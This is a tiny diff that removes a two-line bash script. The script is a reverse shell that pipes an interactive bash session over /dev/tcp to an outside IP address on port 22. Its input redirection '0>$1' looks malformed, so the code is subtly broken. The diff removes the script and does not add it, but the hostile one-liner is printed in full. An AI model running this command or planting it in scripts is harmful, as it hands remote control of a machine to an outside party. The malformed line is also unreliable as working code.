@@ -1,2 +1,0 @@
-#!/bin/bash
-bash -i >& /dev/tcp/1.1.1.1/22 0>$1
